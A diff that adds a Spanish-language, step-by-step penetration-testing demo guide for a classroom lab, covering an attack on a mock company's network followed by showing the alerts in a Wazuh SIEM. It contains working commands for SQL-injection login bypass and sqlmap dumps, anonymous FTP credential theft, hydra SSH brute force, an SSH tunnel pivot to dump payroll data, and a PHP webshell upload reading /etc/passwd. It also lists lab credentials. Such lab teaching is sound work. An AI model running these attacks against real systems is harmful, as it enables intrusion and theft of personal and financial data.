@@ -1,0 +1,308 @@
+================================================================================
+  GUÍA DE AUDITORÍA PASO A PASO  —  PROYECTO JAMSEC vs APEX GESTORÍA
+  Se ejecuta TODO desde la estación de ataque: Kali-RedTeam (VM "jamsec-redteam")
+  Objetivo: Apex Gestoría — perímetro 172.20.17.230
+================================================================================
+
+--------------------------------------------------------------------------------
+ DATOS QUE VAS A USAR (apúntalos / tenlos a mano)
+--------------------------------------------------------------------------------
+  Estación de ataque (Kali):   VM "jamsec-redteam"  (SOC 10.20.10.50)
+       login consola:          usuario  jamsec   /   contraseña  Jamsec2026!
+
+  OBJETIVO (Apex) - perímetro: 172.20.17.230
+       Puerto 80   -> web pública de Apex
+       Puerto 2222 -> SSH del servidor web (apex-web)
+       Puerto 21   -> FTP del servidor interno (apex-srv)
+
+  Redes internas del cliente (sólo se ven DESPUÉS del pivote):
+       apex-web (DMZ)  10.30.20.10
+       apex-db  (LAN)  10.30.10.10   (MariaDB 3306)
+       apex-srv (LAN)  10.30.10.20   (FTP/SSH)
+
+  Credenciales que iremos consiguiendo / usando:
+       Web (login):      admin / Apex.2026!   ·   jmorales / gestoria2024   ·   soporte / soporte123
+       SSH apex-web:     soporte / soporte123
+       SSH apex-srv:     backup  / backup2024
+       BBDD MariaDB:     root / toor     ·     apexweb / apexweb
+
+  Panel de monitorización (para enseñar la detección): Wazuh
+       https://172.20.17.231     usuario admin   (contraseña en CREDENCIALES.txt)
+
+
+================================================================================
+ PARTE 0 — CÓMO ACCEDER EL DÍA DE LA DEMO (desde el PC del profesor, IP 172.x)
+================================================================================
+El PC del profesor está en la red 172.x del aula, la misma del clúster, así que
+NO necesitas túnel ni Tailscale: accedes a todo directo por IP en el navegador.
+
+  1) Abrir el panel de Proxmox en el navegador del PC del profesor:
+        https://172.20.17.202:8006
+     (si esa no carga, prueba https://172.20.17.203:8006 o https://172.20.17.204:8006)
+     El navegador avisará de "certificado no seguro" -> Avanzado -> Continuar.
+     Login Proxmox:  usuario  root   Realm "Linux PAM"   (contraseña de root del nodo)
+
+  2) Conseguir una shell en el Kali (SIN SSH, desde el propio navegador):
+        En el árbol de la izquierda, despliega el nodo "proxmox" -> VM "119 (jamsec-redteam)"
+        Pulsa el botón ">_ Console" (arriba a la derecha).
+        Se abre una terminal dentro del navegador. Inicia sesión:
+              jamsec
+              Jamsec2026!
+        ¡Ya estás dentro del Kali! Aquí escribirás los comandos de esta guía.
+
+  3) Las webs y el Wazuh se abren en otras pestañas del navegador (directo por IP):
+        Web JAMSEC (la tuya):   http://172.20.17.240
+        Web Apex (la víctima):  http://172.20.17.230
+        Wazuh (SIEM):           https://172.20.17.231
+
+  *** Si por lo que sea el PC del profesor NO llegara por IP (otra subred 172):
+      usa tu propio portátil con Tailscale y el script acceso/abrir-accesos.ps1,
+      o pon el vídeo de respaldo. Pero lo normal es que el acceso directo funcione. ***
+
+--------------------------------------------------------------------------------
+ (ALTERNATIVA) Entrar al Kali por SSH desde tu PORTÁTIL (fuera del aula)
+--------------------------------------------------------------------------------
+   ssh jamsec-redteam        (ya configurado en tu ~/.ssh/config, salta por pv2)
+   # o a mano:  ssh -J root@100.114.13.36 jamsec@10.20.10.50
+
+
+================================================================================
+ PARTE 1 — PREPARACIÓN EN EL KALI (comprobaciones iniciales)
+================================================================================
+# 1.1 Ver quién eres y tu IP (debes estar en la red SOC 10.20.10.x):
+whoami
+hostname
+ip -br -4 addr
+
+# 1.2 Definir el objetivo en una variable (cómodo para todo lo demás):
+export TARGET=172.20.17.230
+echo "Objetivo: $TARGET"
+
+# 1.3 Comprobar que el objetivo responde:
+ping -c 3 $TARGET
+
+# 1.4 Crear una carpeta para guardar las evidencias:
+mkdir -p ~/auditoria && cd ~/auditoria
+pwd
+
+
+================================================================================
+ PARTE 2 — RECONOCIMIENTO (nmap)  [ámbito: red]
+================================================================================
+# 2.1 Escaneo rápido de los 1000 puertos más comunes:
+nmap -Pn $TARGET
+
+# 2.2 Escaneo completo de TODOS los puertos TCP (tarda más):
+nmap -Pn -p- $TARGET -oN 01-nmap-todos-los-puertos.txt
+
+# 2.3 Detección de servicios y versiones en los puertos publicados:
+nmap -Pn -sV -p 21,22,80,2222 $TARGET -oN 02-nmap-servicios.txt
+
+# 2.4 Scripts por defecto de nmap (busca info y fallos típicos):
+nmap -Pn -sC -sV -p 21,80,2222 $TARGET -oN 03-nmap-scripts.txt
+
+# 2.5 Scripts específicos de FTP (mira si hay acceso anónimo):
+nmap -Pn -p 21 --script ftp-anon,ftp-syst $TARGET -oN 04-nmap-ftp.txt
+
+# >>> QUÉ DEBES VER: 21/ftp (vsftpd), 80/http (Apache), 2222/ssh (OpenSSH).
+#     El script ftp-anon debe decir que el acceso anónimo está PERMITIDO.
+
+
+================================================================================
+ PARTE 3 — AUDITORÍA WEB  [ámbito: web]
+================================================================================
+# 3.1 Identificar la tecnología de la web:
+whatweb http://$TARGET/
+
+# 3.2 Ver las cabeceras HTTP (fíjate: HTTP sin HTTPS -> sin cifrado):
+curl -I http://$TARGET/
+
+# 3.3 Descargar la página de login para inspeccionarla:
+curl -s http://$TARGET/login.php | head -40
+
+# 3.4 Descubrir rutas/ficheros ocultos con dirb (diccionario):
+dirb http://$TARGET/ /usr/share/dirb/wordlists/common.txt -o 05-dirb.txt
+
+# >>> QUÉ DEBES VER: login.php, panel.php, db.php, carpeta /uploads, etc.
+
+
+================================================================================
+ PARTE 4 — INYECCIÓN SQL EN EL LOGIN  [ámbito: web - CRÍTICO]
+================================================================================
+# 4.1 Prueba MANUAL del bypass de autenticación (entrar sin contraseña).
+#     Enviamos usuario = admin' OR '1'='1  y vemos si redirige al panel:
+curl -s -i http://$TARGET/login.php \
+     --data-urlencode "usuario=admin' OR '1'='1" \
+     --data-urlencode "password=loquesea" | grep -i "location"
+# >>> Si ves "Location: panel.php" -> el bypass FUNCIONA (login saltado).
+
+# 4.2 Confirmar la inyección y enumerar bases de datos con sqlmap:
+sqlmap -u "http://$TARGET/login.php" --data="usuario=admin&password=x" --batch --dbs
+
+# 4.3 Ver las tablas de la base de datos del negocio (apexgestoria):
+sqlmap -u "http://$TARGET/login.php" --data="usuario=admin&password=x" --batch \
+       -D apexgestoria --tables
+
+# 4.4 VOLCAR los datos sensibles (clientes, nóminas, usuarios, facturas):
+sqlmap -u "http://$TARGET/login.php" --data="usuario=admin&password=x" --batch \
+       -D apexgestoria -T clientes,nominas,usuarios,facturas --dump
+
+# 4.5 (Opcional) Volcar TODA la base de datos de golpe:
+sqlmap -u "http://$TARGET/login.php" --data="usuario=admin&password=x" --batch \
+       -D apexgestoria --dump-all
+
+# >>> QUÉ DEBES VER: NIF, IBAN, DNI, salarios y las CONTRASEÑAS de los usuarios
+#     en texto claro (admin/Apex.2026!, etc.). Eso es una brecha de datos completa.
+#     sqlmap guarda copias en CSV dentro de ~/.local/share/sqlmap/output/
+
+
+================================================================================
+ PARTE 5 — FTP CON ACCESO ANÓNIMO  [ámbito: servicios - ALTO]
+================================================================================
+# 5.1 Conexión FTP anónima y listado (modo no interactivo):
+curl -s ftp://$TARGET/ --user anonymous:anonymous
+
+# 5.2 Descargar el fichero de credenciales que está expuesto:
+curl -s -o ftp-credencials.txt ftp://$TARGET/credencials.txt --user anonymous:anonymous
+cat ftp-credencials.txt
+
+# 5.3 Descargar también la copia de seguridad de la base de datos:
+curl -s -o ftp-backup.sql ftp://$TARGET/backup_apexgestoria.sql --user anonymous:anonymous
+cat ftp-backup.sql
+
+# 5.4 (Igual pero con el cliente ftp interactivo, por si lo prefieres enseñar):
+#     ftp -p $TARGET 21
+#       Name: anonymous     Password: (enter)
+#       ls
+#       get credencials.txt
+#       bye
+
+# >>> QUÉ DEBES VER: credencials.txt contiene la contraseña de la BBDD (root/toor),
+#     la de la app (apexweb/apexweb) y la del router. ¡Oro para el siguiente paso!
+
+
+================================================================================
+ PARTE 6 — FUERZA BRUTA DE SSH  [ámbito: credenciales - ALTO]
+================================================================================
+# 6.1 Crear un pequeño diccionario de contraseñas habituales:
+printf '123456\nadmin\npassword\nsoporte\nsoporte123\nroot\ntoor\napex\nadmin123\n' > passwords.txt
+cat passwords.txt
+
+# 6.2 Atacar el usuario "soporte" por SSH (puerto 2222) con hydra:
+hydra -l soporte -P passwords.txt -s 2222 -f ssh://$TARGET -o 06-hydra-ssh.txt
+
+# 6.3 (Opcional) Probar varios usuarios a la vez:
+printf 'soporte\nadmin\nroot\nbackup\napex\n' > usuarios.txt
+hydra -L usuarios.txt -P passwords.txt -s 2222 -f ssh://$TARGET
+
+# >>> QUÉ DEBES VER:  [2222][ssh] host: 172.20.17.230  login: soporte  password: soporte123
+
+
+================================================================================
+ PARTE 7 — ACCESO AL SERVIDOR WEB (foothold)  [ámbito: explotación]
+================================================================================
+# 7.1 Entrar por SSH con la credencial conseguida (te pedirá la contraseña: soporte123):
+ssh -p 2222 -o StrictHostKeyChecking=no soporte@$TARGET
+
+#     --- YA DENTRO de apex-web (la máquina de la DMZ). Ejecuta: ---
+hostname            # debe decir: apex-web
+id                  # quién eres
+ip -br -4 addr      # verás la IP interna 10.30.20.10 (DMZ)
+sudo -l             # ver si puedes hacer sudo
+#     Comprobar que desde aquí SÍ se ve la red interna (esto es el fallo de segmentación):
+ping -c2 10.30.10.10        # base de datos (LAN)
+ping -c2 10.30.10.20        # servidor interno (LAN)
+exit                # salimos para montar el túnel desde el Kali
+
+
+================================================================================
+ PARTE 8 — PIVOTE DMZ -> LAN Y ROBO DE DATOS  [ámbito: movimiento lateral - CRÍTICO]
+================================================================================
+# Idea: usamos apex-web como "puente" para llegar a la base de datos interna
+#       (10.30.10.10) que desde el Kali NO se ve directamente.
+
+# 8.1 Montar un túnel SSH local: el puerto 3307 de tu Kali apuntará a la BBDD interna.
+#     (te pedirá la contraseña de soporte: soporte123. Se queda "colgado": es normal,
+#      deja esta terminal abierta y abre OTRA para el paso 8.2)
+ssh -p 2222 -o StrictHostKeyChecking=no -N -L 3307:10.30.10.10:3306 soporte@$TARGET
+
+# 8.2 EN OTRA TERMINAL del Kali: conectar a la BBDD interna como root con la
+#     contraseña filtrada por el FTP (toor), a través del túnel:
+mysql -h 127.0.0.1 -P 3307 -u root -ptoor -e "SHOW DATABASES;"
+
+# 8.3 Robar las nóminas directamente de la red interna:
+mysql -h 127.0.0.1 -P 3307 -u root -ptoor -e "SELECT empleado,dni,salario_bruto,iban FROM apexgestoria.nominas;"
+
+# 8.4 Robar la cartera de clientes:
+mysql -h 127.0.0.1 -P 3307 -u root -ptoor -e "SELECT nombre,nif,email,iban FROM apexgestoria.clientes;"
+
+# 8.5 (Opcional) entrar a una shell SQL interactiva para enseñar que mandas tú:
+mysql -h 127.0.0.1 -P 3307 -u root -ptoor
+
+# >>> QUÉ DEMUESTRA: has entrado desde internet, has saltado de la DMZ a la red
+#     interna y te has llevado los datos más sensibles. Compromiso total.
+
+#  --- Cuando termines, cierra el túnel: vuelve a la terminal del 8.1 y pulsa Ctrl+C ---
+
+
+================================================================================
+ PARTE 9 — (OPCIONAL, AVANZADO) WEBSHELL POR SUBIDA DE FICHEROS  [ámbito: RCE]
+================================================================================
+# La web deja subir ficheros sin validar. Subimos un PHP que ejecuta comandos.
+
+# 9.1 Crear una webshell mínima en el Kali:
+echo '<?php system($_GET["c"]); ?>' > shell.php
+cat shell.php
+
+# 9.2 Iniciar sesión en la web (con la SQLi) guardando la cookie de sesión:
+curl -s -c cookie.txt -o /dev/null \
+     --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" \
+     http://$TARGET/login.php
+
+# 9.3 Subir la webshell al panel (sección documents), usando la cookie:
+curl -s -b cookie.txt -F "archivo=@shell.php" "http://$TARGET/panel.php?seccion=documents" | grep -i "pujat"
+
+# 9.4 Ejecutar comandos a través de la webshell (RCE):
+curl -s "http://$TARGET/uploads/shell.php?c=id"
+curl -s "http://$TARGET/uploads/shell.php?c=hostname"
+curl -s "http://$TARGET/uploads/shell.php?c=cat+/etc/passwd"
+
+# >>> QUÉ DEMUESTRA: ejecución de comandos en el servidor web a través de la web.
+
+
+================================================================================
+ PARTE 10 — ENSEÑAR LA DETECCIÓN (Blue Team / Wazuh)
+================================================================================
+# Todo lo anterior ha quedado registrado por el SIEM. En el navegador del PC:
+#   1) Abrir  https://172.20.17.231   (admin / contraseña de CREDENCIALES.txt)
+#   2) Ir a "Threat Hunting" o "Security events".
+#   3) Filtrar por el agente "apex-web" o "apex-fw".
+#   4) Mostrar las alertas generadas durante el ataque:
+#        - Suricata: "ET SCAN ... Nmap" (el escaneo del Paso 2)
+#        - "sshd: authentication failed" (la fuerza bruta del Paso 6)
+#        - "sshd: authentication success" (el acceso del Paso 7)
+#        - "vsftpd: FTP Authentication success" (el FTP anónimo del Paso 5)
+#        - errores 500 de la web (los intentos de inyección del Paso 4)
+
+
+================================================================================
+ ATAJO: LANZAR LA AUDITORÍA AUTOMÁTICA (por si vas justo de tiempo)
+================================================================================
+# En el Kali ya están copiados estos scripts (hacen los pasos 2 a 8 solos):
+cd ~
+bash demo-auditoria.sh      # versión guiada con pausas (ENTER entre fases)
+# o por separado:
+bash audit-apex.sh          # recon + web + ftp + fuerza bruta
+bash pivot-apex.sh          # pivote DMZ -> LAN + robo de nóminas
+
+
+================================================================================
+ RESUMEN DE LA CADENA DE ATAQUE (para narrar)
+================================================================================
+  Internet -> escaneo (nmap) -> FTP anónimo (saco contraseñas) ->
+  SQLi en la web (vuelco la BBDD) -> fuerza bruta SSH (entro en la DMZ) ->
+  pivote DMZ a LAN (mala segmentación) -> root en la BBDD interna ->
+  robo de nóminas y datos de clientes.   = COMPROMISO TOTAL.
+
+  Y el SIEM (Wazuh + Suricata) lo ha ido detectando todo.
+================================================================================
